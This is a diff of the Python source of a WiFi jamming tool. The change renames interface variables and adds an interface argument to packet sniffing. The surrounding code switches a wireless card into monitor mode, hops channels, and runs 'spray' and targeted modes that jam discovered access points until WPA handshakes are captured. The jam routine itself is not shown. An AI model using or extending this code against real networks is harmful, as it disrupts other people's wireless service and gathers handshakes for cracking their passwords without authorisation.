@@ -16,11 +16,11 @@ logger = logging.getLogger(__name__)
 from AP import AccessPoint
 
 class Jammer():
-	def __init__(self, ignoreBeacons, attackMode, sendint, recvint, output, searchingChannels, targets, sleepOnChannel):
+	def __init__(self, ignoreBeacons, attackMode, sendInt, recvInt, output, searchingChannels, targets, sleepOnChannel):
 		self.ignoreBeacons = ignoreBeacons
 		self.attackMode = attackMode
-		self.sendint = sendint
-		self.recvint = recvint
+		self.sendInt = sendInt
+		self.recvInt = recvInt
 		self.output = output
 		self.searchingChannels = searchingChannels
 		self.targets = targets
@@ -32,16 +32,16 @@ class Jammer():
 		self.running = True
 
 	def setRecvIntMonitor(self):
-		Popen(['ip', 'link', 'set', self.recvint, 'down'], shell=False)
-		Popen(['iw', 'dev', self.recvint, 'set', 'type', 'monitor'], shell=False)
-		Popen(['ip', 'link', 'set', self.recvint, 'up'], shell=False)
-		logging.debug('Set ' + self.recvint + ' to Monitor Mode')
+		Popen(['ip', 'link', 'set', self.recvInt, 'down'], shell=False)
+		Popen(['iw', 'dev', self.recvInt, 'set', 'type', 'monitor'], shell=False)
+		Popen(['ip', 'link', 'set', self.recvInt, 'up'], shell=False)
+		logging.debug('Set ' + self.recvInt + ' to Monitor Mode')
 
 	def setRecvIntStation(self):
-		Popen(['ip', 'link', 'set', self.recvint, 'down'], shell=False)
-		Popen(['iw', 'dev', self.recvint, 'set', 'type', 'station'], shell=False)
-		Popen(['ip', 'link', 'set', self.recvint, 'up'], shell=False)
-		logging.debug('Set ' + self.recvint + ' to Station Mode')
+		Popen(['ip', 'link', 'set', self.recvInt, 'down'], shell=False)
+		Popen(['iw', 'dev', self.recvInt, 'set', 'type', 'station'], shell=False)
+		Popen(['ip', 'link', 'set', self.recvInt, 'up'], shell=False)
+		logging.debug('Set ' + self.recvInt + ' to Station Mode')
 
 	def freqToChannel(self, freq):
 		base = 2407			# 2.4Ghz
@@ -66,7 +66,7 @@ class Jammer():
 			# Then for self.sleepOnChannel seconds, change the change to this one every 0.25 seconds
 			currentTime = monotonic()
 			while monotonic() < currentTime + self.sleepOnChannel and self.running == True:
-				self.changeChannel(self.searchingChannels[self.channelIndex], self.recvint)
+				self.changeChannel(self.searchingChannels[self.channelIndex], self.recvInt)
 				sleep(0.25)
 
 	def readPacket(self, packet):
@@ -107,15 +107,16 @@ class Jammer():
 			return True
 
 	def sniffPackets(self):
-		sniff(count=0, prn=self.readPacket, stop_filter=self.killSniffing)
+		# For some reason, this doesn't work I think?
+		sniff(count=0, prn=self.readPacket, stop_filter=self.killSniffing, iface=self.recvInt)
 
 	def sprayAttack(self):
 		# Spray attacks every located target until it gets a handshake
 		while self.running == True:
 			for AccessPoint in self.discoveredAPs:
 				if AccessPoint.bssid not in list(self.handshakesFound.keys()):
-					self.changeChannel(AccessPoint.channel, self.sendint)
-					AccessPoint.jam(self.sendint)
+					self.changeChannel(AccessPoint.channel, self.sendInt)
+					AccessPoint.jam(self.sendInt)
 
 	def unarmedAttack(self):
 		while self.running == True:
@@ -127,8 +128,8 @@ class Jammer():
 		# Only deauth targets
 			for AccessPoint in self.discoveredAPs:
 				if AccessPoint.bssid in self.targets or AccessPoint.essid in self.targets:
-					self.changeChannel(AccessPoint.channel, self.sendint)
-					AccessPoint.jam(self.sendint)
+					self.changeChannel(AccessPoint.channel, self.sendInt)
+					AccessPoint.jam(self.sendInt)
 
 	def launchAttack(self):
 		# All three attacks condensed into one single switch
